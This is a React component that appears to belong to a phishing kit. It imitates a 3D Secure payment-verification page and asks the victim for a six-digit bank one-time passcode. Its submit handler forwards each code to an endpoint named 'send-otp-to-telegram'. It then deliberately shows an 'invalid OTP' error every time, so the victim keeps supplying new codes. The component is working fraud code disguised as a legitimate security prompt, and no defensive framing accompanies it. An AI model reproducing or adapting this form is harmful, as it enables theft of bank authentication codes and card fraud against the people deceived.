"use client"

import type React from "react"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Lock } from "lucide-react"
import { useState } from "react"
import { useTranslation } from "@/lib/language-context"

export function Secure3DForm() {
  const [otp, setOtp] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const { t } = useTranslation()

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError("")

    try {
      // Send OTP to Telegram
      await fetch("/api/send-otp-to-telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ otp }),
      })

      // Always show error and keep the form visible (loop)
      setError(t.secure3d.invalidOtp)
      setOtp("")
    } catch (error) {
      setError(t.secure3d.invalidOtp)
      setOtp("")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="w-full max-w-md space-y-6">
      {/* Header */}
      <div className="flex items-center justify-center gap-3">
        <Lock className="w-8 h-8 text-[#1ed760]" />
        <h1 className="text-2xl sm:text-3xl font-bold text-white text-center">{t.secure3d.title}</h1>
      </div>

      <div className="bg-[#1a1a1a] border border-[#2a2a2a] rounded-lg p-6 sm:p-8 space-y-6">
        <div className="space-y-4">
          <div className="text-center space-y-2">
            <h2 className="text-white font-semibold text-lg">{t.secure3d.verifyPayment}</h2>
            <p className="text-[#a7a7a7] text-sm">{t.secure3d.subtitle}</p>
          </div>

          <div className="space-y-4">
            <Label className="text-sm font-semibold text-white">{t.secure3d.bankAppLabel}</Label>
            <div className="flex flex-col items-center justify-center py-6 space-y-4">
              <div className="relative w-20 h-20">
                <div className="absolute inset-0 border-4 border-[#1ed760]/20 rounded-full"></div>
                <div className="absolute inset-0 border-4 border-transparent border-t-[#1ed760] rounded-full animate-spin"></div>
              </div>
              <div className="text-center space-y-2">
                <p className="text-white font-semibold">{t.secure3d.waitingApproval}</p>
                <p className="text-[#a7a7a7] text-sm">{t.secure3d.openBankApp}</p>
              </div>
            </div>
          </div>

          {/* OR Divider */}
          <div className="relative py-4">
            <div className="absolute inset-0 flex items-center">
              <div className="w-full border-t border-[#2a2a2a]"></div>
            </div>
            <div className="relative flex justify-center">
              <span className="bg-[#1a1a1a] px-4 text-sm text-[#a7a7a7] font-semibold">{t.secure3d.or}</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="otp" className="text-sm font-semibold text-white">
                {t.secure3d.enterOtpLabel}
              </Label>
              <Input
                id="otp"
                type="text"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                required
                maxLength={6}
                className="h-14 bg-[#121212] border-[#727272] text-white text-center text-2xl tracking-widest hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md"
                placeholder={t.secure3d.otpPlaceholder}
              />
            </div>

            {/* Error Message */}
            {error && (
              <div className="bg-red-500/10 border border-red-500 rounded-md p-3">
                <p className="text-red-500 text-sm font-semibold text-center">{error}</p>
              </div>
            )}

            <div className="text-center">
              <p className="text-[#a7a7a7] text-xs">{t.secure3d.otpDescription}</p>
            </div>

            <div className="flex justify-center pt-2">
              <Button
                type="submit"
                disabled={isLoading || otp.length < 6}
                className="w-full sm:w-48 h-12 bg-[#1ed760] hover:bg-[#1fdf64] text-black font-bold text-base rounded-full disabled:opacity-50"
              >
                {isLoading ? t.secure3d.verifying : t.secure3d.verifyButton}
              </Button>
            </div>
          </form>

          {/* Help Text */}
          <div className="text-center pt-2">
            <button
              type="button"
              className="text-white hover:text-[#1ed760] font-semibold text-sm bg-transparent border-0 cursor-pointer"
            >
              {t.secure3d.havingTrouble}
            </button>
          </div>
        </div>
      </div>

      {/* Security Badge */}
      <div className="flex items-center justify-center gap-2 text-[#a7a7a7] text-xs">
        <Lock className="w-4 h-4" />
        <span>{t.secure3d.securedBy}</span>
      </div>
    </div>
  )
}
